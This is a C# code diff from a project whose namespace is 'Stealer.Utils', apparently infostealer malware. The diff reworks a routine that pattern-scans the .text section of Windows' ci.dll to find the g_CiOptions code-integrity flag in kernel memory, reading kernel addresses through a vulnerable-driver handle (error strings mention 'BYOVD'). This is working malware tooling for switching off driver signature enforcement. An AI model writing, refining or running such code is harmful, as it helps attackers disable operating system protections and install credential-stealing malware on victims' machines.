@@ -338,10 +338,10 @@ namespace Stealer.Utils
             return true;
         }
 
-        private static bool GetModuleDataSection(IntPtr userBase, out uint dataRva, out uint dataSize)
+        private static bool GetModuleSections(IntPtr userBase, out uint textRva, out uint textSize, out uint dataRva, out uint dataSize)
         {
-            dataRva = 0;
-            dataSize = 0;
+            textRva = 0; textSize = 0;
+            dataRva = 0; dataSize = 0;
             try
             {
                 int e_lfanew = Marshal.ReadInt32(new IntPtr(userBase.ToInt64() + 0x3C));
@@ -360,13 +360,18 @@ namespace Stealer.Utils
                         if (b == 0) break;
                         secName += (char)b;
                     }
-                    if (string.Equals(secName, ".data", StringComparison.OrdinalIgnoreCase))
+                    if (string.Equals(secName, ".text", StringComparison.OrdinalIgnoreCase))
+                    {
+                        textSize = (uint)Marshal.ReadInt32(sec, 8);
+                        textRva = (uint)Marshal.ReadInt32(sec, 12);
+                    }
+                    else if (string.Equals(secName, ".data", StringComparison.OrdinalIgnoreCase))
                     {
                         dataSize = (uint)Marshal.ReadInt32(sec, 8);
                         dataRva = (uint)Marshal.ReadInt32(sec, 12);
-                        return true;
                     }
                 }
+                return (textRva != 0 && dataRva != 0);
             }
             catch { }
             return false;
@@ -400,28 +405,70 @@ namespace Stealer.Utils
 
             try
             {
-                uint dataRva = 0, dataSize = 0;
-                GetModuleDataSection(userCiBase, out dataRva, out dataSize);
-
-                IntPtr ciInitializeAddr = GetProcAddress(userCiBase, "CiInitialize");
-                IntPtr gCiOptionsKernelAddr = IntPtr.Zero;
-
-                if (ciInitializeAddr != IntPtr.Zero)
+                uint textRva, textSize, dataRva, dataSize;
+                if (!GetModuleSections(userCiBase, out textRva, out textSize, out dataRva, out dataSize))
                 {
-                    gCiOptionsKernelAddr = ScanForGCiOptions(ciInitializeAddr, 0x1000, userCiBase, ciKernelBase, hDev, dataRva, dataSize);
+                    textRva = 0x1000; textSize = 0x40000;
+                    dataRva = 0x40000; dataSize = 0x10000;
                 }
 
-                if (gCiOptionsKernelAddr == IntPtr.Zero)
+                IntPtr userTextStart = new IntPtr(userCiBase.ToInt64() + textRva);
+                IntPtr kernelDataStart = new IntPtr(ciKernelBase.ToInt64() + dataRva);
+                IntPtr kernelDataEnd = new IntPtr(kernelDataStart.ToInt64() + dataSize + 0x4000);
+
+                byte[] code = new byte[textSize];
+                Marshal.Copy(userTextStart, code, 0, (int)textSize);
+
+                for (int i = 0; i < (int)textSize - 10; i++)
                 {
-                    gCiOptionsKernelAddr = ScanModuleForGCiOptionsPattern(userCiBase, ciKernelBase, hDev, dataRva, dataSize);
+                    int rel = 0;
+                    IntPtr nextInstr = IntPtr.Zero;
+
+                    // 1. mov [g_CiOptions], 6 -> C7 05 XX XX XX XX 06 00 00 00
+                    if (code[i] == 0xC7 && code[i + 1] == 0x05 &&
+                        code[i + 6] == 0x06 && code[i + 7] == 0x00 && code[i + 8] == 0x00 && code[i + 9] == 0x00)
+                    {
+                        rel = BitConverter.ToInt32(code, i + 2);
+                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 10);
+                    }
+                    // 2. cmp [g_CiOptions], 0 / 6 -> 83 3D XX XX XX XX 00 / 06
+                    else if (code[i] == 0x83 && code[i + 1] == 0x3D && (code[i + 6] == 0x00 || code[i + 6] == 0x06))
+                    {
+                        rel = BitConverter.ToInt32(code, i + 2);
+                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 7);
+                    }
+                    // 3. Standard MOV relative (89 05 / 8B 05 / 89 0D / 8B 0D)
+                    else if ((code[i] == 0x89 || code[i] == 0x8B) && ((code[i + 1] & 0xC7) == 0x05 || (code[i + 1] & 0xC7) == 0x0D))
+                    {
+                        rel = BitConverter.ToInt32(code, i + 2);
+                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 6);
+                    }
+                    // 4. REX prefix MOV relative (44/48 89/8B)
+                    else if ((code[i] == 0x44 || code[i] == 0x48) && (code[i + 1] == 0x89 || code[i + 1] == 0x8B) && ((code[i + 2] & 0xC7) == 0x05 || (code[i + 2] & 0xC7) == 0x0D))
+                    {
+                        rel = BitConverter.ToInt32(code, i + 3);
+                        nextInstr = new IntPtr(userTextStart.ToInt64() + i + 7);
+                    }
+
+                    if (nextInstr != IntPtr.Zero)
+                    {
+                        IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
+                        long offset = userTarget.ToInt64() - userCiBase.ToInt64();
+                        IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
+
+                        if (cand.ToInt64() >= kernelDataStart.ToInt64() && cand.ToInt64() < kernelDataEnd.ToInt64())
+                        {
+                            uint val = ReadKernelMemory32WithHandle(hDev, cand);
+                            if (val == 6 || val == 0x6 || val == 0xE || val == 0x8 || val == 0x2 || (val != 0 && (val & 6) != 0))
+                            {
+                                return cand;
+                            }
+                        }
+                    }
                 }
 
-                if (gCiOptionsKernelAddr == IntPtr.Zero)
-                {
-                    errDetail = "BYOVD: Pattern scan found no g_CiOptions candidate (ciKernelBase=0x" + ciKernelBase.ToString("X") + ")";
-                }
-
-                return gCiOptionsKernelAddr;
+                errDetail = "BYOVD: Pattern scan found no g_CiOptions candidate in .text section (ciKernelBase=0x" + ciKernelBase.ToString("X") + ")";
+                return IntPtr.Zero;
             }
             finally
             {
@@ -463,100 +510,6 @@ namespace Stealer.Utils
             {
                 Marshal.FreeHGlobal(buffer);
             }
-
-            return IntPtr.Zero;
-        }
-
-        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset, IntPtr userCiBase, IntPtr ciKernelBase, IntPtr hDev, uint dataRva, uint dataSize)
-        {
-            byte[] code = new byte[maxOffset];
-            Marshal.Copy(baseAddr, code, 0, maxOffset);
-
-            IntPtr dataKernelStart = (dataRva != 0) ? new IntPtr(ciKernelBase.ToInt64() + dataRva) : IntPtr.Zero;
-            IntPtr dataKernelEnd = (dataRva != 0) ? new IntPtr(dataKernelStart.ToInt64() + dataSize) : IntPtr.Zero;
-
-            // Pattern 1: mov dword ptr [g_CiOptions], 6 -> C7 05 XX XX XX XX 06 00 00 00
-            for (int i = 0; i < maxOffset - 10; i++)
-            {
-                if (code[i] == 0xC7 && code[i + 1] == 0x05 &&
-                    code[i + 6] == 0x06 && code[i + 7] == 0x00 &&
-                    code[i + 8] == 0x00 && code[i + 9] == 0x00)
-                {
-                    int rel = BitConverter.ToInt32(code, i + 2);
-                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 10);
-                    IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                    long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-                    return cand;
-                }
-            }
-
-            // Pattern 2: 89 05 / 8B 05 / 89 0D / 8B 0D (Standard MOV relative)
-            for (int i = 0; i < maxOffset - 6; i++)
-            {
-                if ((code[i] == 0x89 || code[i] == 0x8B) && ((code[i + 1] & 0xC7) == 0x05 || (code[i + 1] & 0xC7) == 0x0D))
-                {
-                    int rel = BitConverter.ToInt32(code, i + 2);
-                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 6);
-                    IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                    long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-
-                    if (dataRva == 0 || (cand.ToInt64() >= dataKernelStart.ToInt64() && cand.ToInt64() < dataKernelEnd.ToInt64()))
-                    {
-                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                        if (val != 0) return cand;
-                    }
-                }
-            }
-
-            // Pattern 3: 44 8B 05 / 48 8B 05 (REX prefix MOV relative)
-            for (int i = 0; i < maxOffset - 7; i++)
-            {
-                if ((code[i] == 0x44 || code[i] == 0x48) && (code[i + 1] == 0x89 || code[i + 1] == 0x8B) && ((code[i + 2] & 0xC7) == 0x05 || (code[i + 2] & 0xC7) == 0x0D))
-                {
-                    int rel = BitConverter.ToInt32(code, i + 3);
-                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 7);
-                    IntPtr userTarget = new IntPtr(nextInstr.ToInt64() + rel);
-                    long offset = userTarget.ToInt64() - userCiBase.ToInt64();
-                    IntPtr cand = new IntPtr(ciKernelBase.ToInt64() + offset);
-
-                    if (dataRva == 0 || (cand.ToInt64() >= dataKernelStart.ToInt64() && cand.ToInt64() < dataKernelEnd.ToInt64()))
-                    {
-                        uint val = ReadKernelMemory32WithHandle(hDev, cand);
-                        if (val != 0) return cand;
-                    }
-                }
-            }
-
-            return IntPtr.Zero;
-        }
-
-        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase, IntPtr ciKernelBase, IntPtr hDev, uint dataRva, uint dataSize)
-        {
-            string[] exports = new string[] {
-                "CiInitialize",
-                "CiFreePolicyInfo",
-                "CiValidateImageHeader",
-                "CipReportSecurityViolation"
-            };
-
-            foreach (string exp in exports)
-            {
-                IntPtr exportAddr = GetProcAddress(userBase, exp);
-                if (exportAddr != IntPtr.Zero)
-                {
-                    IntPtr target = ScanForGCiOptions(exportAddr, 0x1000, userBase, ciKernelBase, hDev, dataRva, dataSize);
-                    if (target != IntPtr.Zero) return target;
-                }
-            }
-
-            try
-            {
-                IntPtr textSection = new IntPtr(userBase.ToInt64() + 0x1000);
-                return ScanForGCiOptions(textSection, 0x30000, userBase, ciKernelBase, hDev, dataRva, dataSize);
-            }
-            catch { }
 
             return IntPtr.Zero;
         }
